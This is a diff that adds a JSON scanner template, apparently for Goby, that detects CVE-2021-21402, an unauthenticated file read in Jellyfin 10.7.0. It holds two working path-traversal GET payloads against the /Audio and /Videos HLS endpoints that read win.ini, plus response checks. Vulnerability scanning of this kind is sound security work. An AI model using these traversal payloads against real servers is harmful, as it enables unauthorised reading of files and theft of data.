@@ -1,0 +1,86 @@
+{
+      "Name": "Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402",
+      "Level": "2",
+      "Tags": [],
+      "GobyQuery": "title=\"Jellyfin\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-07 15:10:20",
+      "GobyVersion": "1.8.255"
+}
